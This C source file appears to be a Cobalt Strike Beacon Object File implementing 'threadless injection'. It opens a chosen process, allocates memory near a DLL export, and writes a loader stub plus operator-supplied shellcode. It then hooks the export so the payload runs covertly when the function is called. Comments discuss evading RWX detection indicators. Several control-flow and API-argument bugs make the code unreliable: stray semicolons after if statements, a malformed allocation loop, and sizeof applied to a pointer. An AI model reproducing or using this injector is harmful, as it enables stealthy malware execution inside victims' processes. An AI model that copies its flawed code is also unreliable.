#include <stdio.h>
#include <windows.h>
#include <stddef.h>
#include "beacon.h"

unsigned char shellcodeLoader[] =
{
        0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
        0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
        0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
        0xE0, 0x90
};

/*
    this part broke my brain a bit, from what i understand the entire process goes:

    - (writer.Seek) move to the offset in shellcodeLoader (0x12 (or 18 in decimal), assembly instruction mov QWORD PTR [rax],rcx)
    - (writer.Write) write the original 8 bytes that were in the original export
    - (writer.Flush) hook using modified shellcode loader
*/

void GenerateHook(UINT_PTR originalInstructions, char * shellcodeLoader)
{
    char * writer = shellcodeLoader;

    writer += 0x12;

    for (int i = 0; i < 8; i++) 
    {
        writer[i] = ((char*)&originalInstructions)[i];
    }
}

UINT_PTR findMemoryHole(HANDLE hProcess, UINT_PTR pExportFunctionAddress, SIZE_T size)
{
    UINT_PTR remoteLoaderAddress;
    BOOL foundMemory = FALSE;

    for (remoteLoaderAddress = (pExportFunctionAddress & 0xFFFFFFFFFFF70000) - 0x70000000; remoteLoaderAddress < pExportFunctionAddress + 0x70000000; remoteLoaderAddress += 0x10000)
    {
        if (!VirtualAllocEx(hProcess, &remoteLoaderAddress, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ));
        {
            BeaconPrintf(CALLBACK_OUTPUT, "findMemoryHole Failed. Error Code: %d", GetLastError());
            continue;

            foundMemory = TRUE;
            break;
        }

        return foundMemory ? remoteLoaderAddress : 0;
    }
}

void go(char * buff, int len)
{
    HMODULE         hDll = NULL;
    UINT_PTR        pExportFunctionAddress = NULL;
    HANDLE          hProcess = NULL;
    UINT_PTR        loaderAddress = NULL;
    UINT_PTR        originalInstructions = NULL;
    SIZE_T          protectSize = 8;
    PDWORD          oldProtect = NULL;
    UINT_PTR        relativeLoaderAddress = NULL;
    unsigned char   callOpCode[] = { 0xe8, 0, 0, 0, 0 };
    SIZE_T          bytesWritten = NULL;
    SIZE_T          shellcodeRegion = NULL;

    datap parser;
    CHAR * shellcode;
    CHAR * dll;
    CHAR * export;
    CHAR * pid;

    BeaconDataParse(&parser, buff, len);
    shellcode = BeaconDataExtract(&parser, sizeof(shellcode));
    dll = BeaconDataExtract(&parser, NULL);
    export = BeaconDataExtract(&parser, NULL);
    pid = BeaconDataExtract(&parser, NULL);

    // get handle to operator's chosen dll
    hDll = GetModuleHandleA(dll);
    if (dll == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to Obtain Handle to %s. Error Code: %d\n", dll, GetLastError());
        return;
    }

    // get base address of operator's chosen export function
    pExportFunctionAddress = GetProcAddress(hDll, export);
    if (pExportFunctionAddress == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to Obtain Address of %s!%s. Error Code: %d\n", dll, export, GetLastError());
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Found %s!%s at 0x%x", dll, export, pExportFunctionAddress);

    // get handle to process of operator's choosing
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to Open Process. Error Code: %d\n", GetLastError());
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Opened Process with PID %s", pid);

    // find the memory hole as shown in CCob's presentation, where the alignment of the assembly can occur in
    loaderAddress = findMemoryHole(hProcess, pExportFunctionAddress, sizeof(shellcodeLoader) + sizeof(shellcode));
    if (loaderAddress == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to Find Memory Hole with 2G of Export Address. Error Code: %d", GetLastError());
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Allocated Loader and Shellcode at 0x%x", loaderAddress);

    // get the original instructions of export function for GenerateHook
    for (int i = 0; i < 8; i++)
    {
        ((CHAR*)&originalInstructions)[i] = ((CHAR*)pExportFunctionAddress)[i];
    }

    // create the hook for threadless injection
    GenerateHook(originalInstructions, shellcodeLoader);

    // unfortunate RWX IOC as mentioned by CCob. TO-DO: try implementing VirtualProtect in the assembly stub?
    if (!VirtualProtectEx(hProcess, &pExportFunctionAddress, &protectSize, PAGE_EXECUTE_READWRITE, &oldProtect));
    {
        BeaconPrintf(CALLBACK_ERROR, "RWX Protect Failed. Error Code: %d", GetLastError());
    }

    // create the call op code which will act as the jmp at the right offset
    relativeLoaderAddress = loaderAddress - pExportFunctionAddress + 5;

    for (int i = 0; i < sizeof(callOpCode); i++)
    {
        callOpCode[i] = ((unsigned char*)&relativeLoaderAddress)[i];
    }

    // write callOpCode to base address of export function
    if (!WriteProcessMemory(hProcess, &pExportFunctionAddress, &callOpCode, sizeof(callOpCode), &bytesWritten));
    {
        BeaconPrintf(CALLBACK_ERROR, "OpCode WPM Failed. Error Code: %d", GetLastError());
    }

    // change assembly memory to RW, this happens later in CCob's write chain but needs to happen (i assume) to avoid an RWX payload write (IOC)
    // calculate the size to fit everything, so protect will cover the entire payload
    SIZE_T assemblySize = sizeof(shellcodeLoader) + sizeof(shellcode);

    if (!VirtualProtectEx(hProcess, &loaderAddress, &assemblySize, PAGE_READWRITE, &oldProtect));
    {
        BeaconPrintf(CALLBACK_ERROR, "Assembly RW Protect Failed. Error Code: %d", GetLastError());
    }

    // write loader + shellcode below call op code. C# makes this look easy in CCob's example, but chatGPT and other malware ppl confirm you need two mem writes which kinda sucks
    // implement a check if a successful write occurs, compare to the size of the loader
    if (WriteProcessMemory(hProcess, loaderAddress, shellcodeLoader, sizeof(shellcodeLoader), &bytesWritten));
    {
        if (bytesWritten != sizeof(shellcodeLoader))
        {
            BeaconPrintf(CALLBACK_ERROR, "Loader WPM Failed. Error Code: %d", GetLastError());
        }
    }

    // write shellcode after recently written shellcode loader
    shellcodeRegion = loaderAddress + sizeof(shellcodeLoader);

    if (WriteProcessMemory(hProcess, shellcodeRegion, shellcode, sizeof(shellcode), &bytesWritten));
    {
        if (bytesWritten != sizeof(shellcode))
        {
            BeaconPrintf(CALLBACK_ERROR, "Shellcode WPM Failed. Error Code: %d", GetLastError());
        }
    }

    // set protect back to RX, try to avoid oldProtect which is RWX
    if (!VirtualProtectEx(hProcess, &loaderAddress, &assemblySize, PAGE_EXECUTE_READ, &oldProtect));
    {
        BeaconPrintf(CALLBACK_ERROR, "Assembly RX Protect Failed. Error Code: %d", GetLastError());
    }

    // dont want to wait like in CCob's original POC, just close the process handle and a beacon will return when the function is called
    BeaconPrintf(CALLBACK_OUTPUT, "Threadless Injection complete! Your payload will be launched when the function of your choosing is called.");

    CloseHandle(hProcess);
}